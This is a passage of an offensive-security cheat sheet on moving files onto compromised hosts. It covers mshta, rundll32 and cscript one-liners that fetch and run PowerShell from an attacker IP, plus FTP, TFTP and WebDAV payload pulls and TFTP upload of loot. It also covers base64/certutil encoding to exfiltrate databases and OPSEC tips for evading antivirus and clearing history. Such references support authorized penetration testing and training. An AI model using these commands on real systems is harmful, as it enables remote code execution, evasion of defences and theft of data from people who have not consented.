**Direct execution from SMB** (`\\IP\share\tool.exe`) is extremely powerful — the binary never touches the target's filesystem, bypassing many file-based AV detections. The tool runs in memory from the network share.
::

---

### mshta / rundll32 / cscript

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="LOLBins" color="orange"}
  :badge{label="Download + Execute" color="green"}
  :badge{label="HIGH Detection" color="red"}
  :badge{label="PS Bypass" color="purple"}
::

Alternative LOLBin techniques for when PowerShell is blocked, constrained, or heavily logged. Each uses a different built-in Windows binary to download and execute code.

::code-collapse

```powershell [mshta.exe — HTML Applications]
:: Execute remote HTA file
mshta http://10.10.14.5/payload.hta

:: Inline VBScript via mshta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX (iwr http://10.10.14.5/shell.ps1)"", 0:close")

:: Inline JavaScript via mshta
mshta javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("powershell -ep bypass -c IEX(iwr http://10.10.14.5/s.ps1)");close();
```

```powershell [rundll32.exe — DLL Loading]
:: Execute JavaScript through rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX (iwr http://10.10.14.5/shell.ps1)")

:: Load DLL from remote SMB share
rundll32.exe \\10.10.14.5\share\payload.dll,EntryPoint
```

```powershell [cscript.exe — VBScript Download]
:: One-liner: create VBS downloader and execute
echo Set o=CreateObject("MSXML2.XMLHTTP"):o.Open "GET","http://10.10.14.5/nc.exe",False:o.Send:Set s=CreateObject("Adodb.Stream"):s.Type=1:s.Open:s.Write o.responseBody:s.SaveToFile "C:\Temp\nc.exe",2 > dl.vbs & cscript //nologo dl.vbs
```

::

::card-group
  ::card
  ---
  title: LOLBAS Project
  icon: i-lucide-terminal
  to: https://lolbas-project.github.io/#/download
  target: _blank
  ---
  Complete reference of Windows LOLBins with download, execute, and lateral movement capabilities.
  ::
::

---

### FTP / TFTP / WebDAV (Windows)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Legacy Protocols" color="green"}
  :badge{label="Built-in" color="orange"}
::

Fallback methods using older protocols when HTTP-based transfers are blocked.

::code-collapse

```powershell [FTP Script Method]
:: Create FTP command file and execute
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get payload.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
del ftp.txt
```

```powershell [TFTP — UDP Transfer]
:: Download via TFTP (requires TFTP client feature)
tftp -i 10.10.14.5 GET payload.exe

:: Upload via TFTP
tftp -i 10.10.14.5 PUT C:\Windows\Temp\loot.txt

:: Enable TFTP client if disabled:
:: dism /online /Enable-Feature /FeatureName:TFTP
```

```powershell [WebDAV — Mapped Drive]
:: Mount WebDAV as network drive
net use W: http://10.10.14.5/ /user: ""

:: Copy from WebDAV
copy W:\payload.exe C:\Windows\Temp\

:: Execute directly from WebDAV
\\10.10.14.5\DavWWWRoot\payload.exe
```

::

---

## :icon{name="i-lucide-binary"} Base64 / Encoding Transfers

Use encoding methods when **network transfers are restricted**, firewalls block all outbound connections, or you need to transfer through a **copy-paste interface** (e.g., web shell, RDP session, limited terminal).

### Linux — Base64

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Encode / Decode" color="blue"}
  :badge{label="No Network" color="orange"}
  :badge{label="Copy-Paste" color="red"}
  :badge{label="Built-in" color="purple"}
::

```bash [Attacker — Encode]
# Encode file to base64 (single line output)
base64 -w0 payload.elf ; echo

# Record hash for integrity verification
md5sum payload.elf
```

```bash [Target — Decode]
# Decode base64 string to file
echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA..." | base64 -d > payload.elf
chmod +x payload.elf

# Verify integrity
md5sum payload.elf
```

---

### Windows — Base64 (PowerShell)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="PowerShell" color="green"}
  :badge{label="Encode / Decode" color="orange"}
  :badge{label=".NET" color="red"}
::

```powershell [Decode — Write file from base64]
$b64 = "TVqQAAMAAAAEAAAA//8AALgAAAA..."
[IO.File]::WriteAllBytes("C:\Windows\Temp\payload.exe", [Convert]::FromBase64String($b64))
```

```powershell [Encode — Exfiltrate as base64]
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\admin\secrets.db"))
```

---

### Windows — Base64 (certutil)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="certutil" color="green"}
  :badge{label="Encode / Decode" color="orange"}
::

```powershell [certutil — Decode]
:: Save base64 to file first
echo TVqQAAMAAAAEAAAA... > encoded.b64

:: Decode to binary
certutil -decode encoded.b64 payload.exe

:: Verify hash
certutil -hashfile payload.exe MD5

:: Cleanup
del encoded.b64
```

```powershell [certutil — Encode for exfil]
certutil -encode C:\sensitive\data.db encoded.b64
type encoded.b64
```

---

### Hex Encoding

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Both" color="green"}
  :badge{label="Hex" color="blue"}
  :badge{label="Alternative" color="orange"}
  :badge{label="When Base64 Unavailable" color="red"}
::

When Base64 tools are unavailable, hex encoding provides a universal fallback.

::code-collapse

```bash [Linux — Encode to hex]
xxd -p payload.elf | tr -d '\n'
od -A n -t x1 payload.elf | tr -d ' \n'
```

```bash [Linux — Decode from hex]
echo "7f454c46..." | xxd -r -p > payload.elf
chmod +x payload.elf
```

```powershell [Windows — Decode from hex]
$hex = "4d5a90000300000004000000..."
$bytes = [byte[]]::new($hex.Length / 2)
for ($i = 0; $i -lt $hex.Length; $i += 2) {
    $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
}
[IO.File]::WriteAllBytes("C:\Temp\payload.exe", $bytes)
```

::

::note
Base64 encoding increases file size by **~33%**. Hex encoding doubles it (**100% increase**). For files larger than ~1MB, encoding-based transfers become impractical — use network methods instead.
::

---

## :icon{name="i-lucide-shield-check"} Integrity Verification

Always verify file hashes after transfer to confirm no corruption occurred during transmission.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux"}
  ```bash [Linux]
  md5sum payload.elf
  sha256sum payload.elf
  sha1sum payload.elf
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows"}
  ```powershell [PowerShell]
  Get-FileHash C:\Temp\payload.exe -Algorithm SHA256
  Get-FileHash C:\Temp\payload.exe -Algorithm MD5
  ```

  ```powershell [certutil]
  certutil -hashfile C:\Temp\payload.exe MD5
  certutil -hashfile C:\Temp\payload.exe SHA256
  ```
  :::
::

---

## :icon{name="i-lucide-search"} Tool Discovery

Before attempting transfers, **discover which tools are available** on the target system.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux"}
  ```bash [Check available tools]
  which wget curl nc ncat python python3 perl ruby php lua openssl awk busybox tftp ftp socat 2>/dev/null
  ```

  ```bash [Test outbound connectivity]
  curl -s http://10.10.14.5/test
  nc -zv 10.10.14.5 80
  nc -zv 10.10.14.5 443
  ping -c 1 10.10.14.5
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows"}
  ```powershell [Check available tools]
  where curl.exe certutil bitsadmin powershell tftp ftp 2>$null
  Get-Command Invoke-WebRequest,Start-BitsTransfer -ErrorAction SilentlyContinue
  ```

  ```powershell [Test outbound connectivity]
  Test-NetConnection 10.10.14.5 -Port 80
  Test-NetConnection 10.10.14.5 -Port 443
  ```
  :::
::

---

## :icon{name="i-lucide-list-checks"} Decision Matrix

::steps{level="4"}

#### No restrictions — full network access

| Target OS | Recommended Method |
| --------- | ------------------ |
| Linux | `wget` or `curl` |
| Windows | `PowerShell IWR` or `curl.exe` |

#### HTTP blocked — need alternative protocol

| Protocol | Attacker Setup | Target Download |
| -------- | -------------- | --------------- |
| SMB | `impacket-smbserver` | `copy \\IP\share\file.exe` |
| FTP | `python3 -m pyftpdlib` | `ftp` or `wget ftp://` |
| TFTP | `atftpd` | `tftp -i IP GET file` |

#### Common tools removed — LOLBins only

| Target OS | Fallback Methods |
| --------- | ---------------- |
| Linux | `/dev/tcp` → `openssl` → `awk` |
| Windows | `certutil` → `bitsadmin` → `cscript` |

#### No network at all — encoding transfer

| Method | Overhead | Best For |
| ------ | -------- | -------- |
| Base64 | +33% size | Files < 1MB |
| Hex | +100% size | Files < 500KB |

::

---

## :icon{name="i-lucide-shield-alert"} Detection Risk Reference

| Risk Level | Payloads |
| ---------- | -------- |
| :badge{label="HIGH" color="red"} | `certutil -urlcache` · `mshta` · `IEX(DownloadString)` · `rundll32` URL · `bitsadmin` |
| :badge{label="MEDIUM" color="orange"} | `Invoke-WebRequest` · `Start-BitsTransfer` · `wget` · Python/Perl/Ruby one-liners |
| :badge{label="LOW" color="green"} | `curl.exe` · `scp` / `sftp` · `openssl s_client` · SMB share access · Base64 decode · `/dev/tcp` |

::tip
**OPSEC reminders:**
- Prefer **HTTPS** over HTTP
- Use **common ports** (80, 443) to blend with normal traffic
- **Clean up** — delete transferred files, clear history (`history -c`)
- Match **User-Agent strings** to the target environment
- Use **SMB direct execution** to avoid writing to disk entirely
::

---

## :icon{name="i-lucide-book-open"} References

::card-group
  ::card
  ---
  title: GTFOBins
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/#+file%20download
  target: _blank
  ---
  Linux binaries that support file download and upload capabilities. Searchable by function.
  ::

  ::card
  ---
  title: LOLBAS Project
  icon: i-lucide-terminal
  to: https://lolbas-project.github.io/#/download
  target: _blank
  ---
  Windows Living Off The Land Binaries — file download, execute, and lateral movement.
  ::

  ::card
  ---
  title: HackTricks — Exfiltration
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/exfiltration.html
  target: _blank
  ---
  Comprehensive exfiltration techniques including DNS, ICMP, and HTTP tunneling.
  ::

  ::card
  ---
  title: PayloadsAllTheThings
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md
  target: _blank
  ---
  Community-maintained repository with Windows download and execute payload reference.
  ::

  ::card
  ---
  title: curl Documentation
  icon: i-lucide-globe
  to: https://curl.se/docs/
  target: _blank
  ---
  Official curl project documentation — protocols, flags, and examples.
  ::

  ::card
  ---
  title: Impacket Tools
  icon: i-simple-icons-github
  to: https://github.com/fortra/impacket
  target: _blank
  ---
  Python collection for working with SMB, WMI, DCOM, and other Windows network protocols.
  ::
::
